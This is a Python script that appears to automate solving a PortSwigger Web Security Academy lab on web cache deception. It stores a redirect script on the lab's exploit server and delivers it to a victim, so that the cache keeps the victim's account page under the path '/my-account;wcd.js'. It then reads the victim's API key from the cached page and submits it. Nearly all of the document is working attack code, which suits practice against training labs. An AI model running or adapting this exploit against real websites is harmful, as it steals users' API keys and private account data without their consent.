import requests
from lxml import html
from rich.console import Console

console = Console()

lab_id = console.input("[red bold]Insert Portswigger  lab id: ")

lab_url = f'https://{lab_id}.web-security-academy.net'

#get the exploit Server domain from the lab main page
def getExploitServerDomain():
    response = requests.get(lab_url)
    tree = html.fromstring(response.content)
    #we get the link to the exploit server
    href = tree.xpath(f"//a[@id='exploit-link']/@href")
    return href[0] if href else None

# this is the compromised url where we use the delimiter ";" to put wcd.js at the end of the path
# with this delimiter now;
#  the cache server sees: /my-account;wcd.js -> so it cached the response since it ends with .js
#  the origin server sees: /my-account -> so it serves the user's profile
def getCompromisedUrl():
    return f"{lab_url}/my-account;wcd.js"

#this is the content of the attacker's website
#it makes a get request in main navigation so we avoid possible problems with sessions or cookie jars (in firefox)
def getCompromisedScript():
    return f"<script>document.location=\"{getCompromisedUrl()}\"</script>"

#request to serve the malious script in the exploit server
def store_malicious_script(exploit_server):

    form_data = {
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "responseHead": "HTTP/1.1 200 OK",
        "Content-Type": "text/html; charset=utf-8",
        "responseBody": getCompromisedScript(),
        "formAction": "STORE"
    }

    response = requests.post(exploit_server, data=form_data)

#make the victim click the link
def deliver_to_victim(exploit_server):

    form_data = {
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "responseHead": "HTTP/1.1 200 OK",
        "responseBody": getCompromisedScript(),
        "formAction": "DELIVER_TO_VICTIM"
    }
    response = requests.post(exploit_server, data=form_data)

#after carlos makes the request its response should be cached in the server
#and now we retrive carlo's API key stored inside it by making the same request
def get_api_key():

    response = requests.get(getCompromisedUrl())
    tree = html.fromstring(response.content)
    api_key_div = tree.xpath(f"//div[@id='account-content']//div/text()")
    if api_key_div:
        api_key = api_key_div[0].replace("Your API Key is: ", "")
        return api_key
    return None

#submit the solution containing the API key to portswigger
def submitResponse(exploit_server, api_key):
    response = requests.post(f"{exploit_server}/submitSolution", data={"answer": api_key})


with console.status("RETRIEVING EXPLOIT SERVER.") as status:

    try:
        
        exploit_server = getExploitServerDomain()

        if exploit_server == None:
            console.log("EXPLOIT SERVER NOT FOUND")
        else:
            status.update("STORE EXPLOIT TO SERVER.")
            store_malicious_script(exploit_server)

            status.update("DELIVERING TO VICTIM.")
            deliver_to_victim(exploit_server)

            status.update("RETRIVING API KEY")
            api_key = get_api_key()

            if api_key != None:
                status.update("SUBMITTING RESPONSE")
                submitResponse(exploit_server, api_key)
                console.log("EXPLOIT COMPLETE")
            else:
                console.log("UNABLE TO RETRIVE API KEY")
    except Exception as e:
        console.log(f"ERROR IN PHASE '{status.status}'")


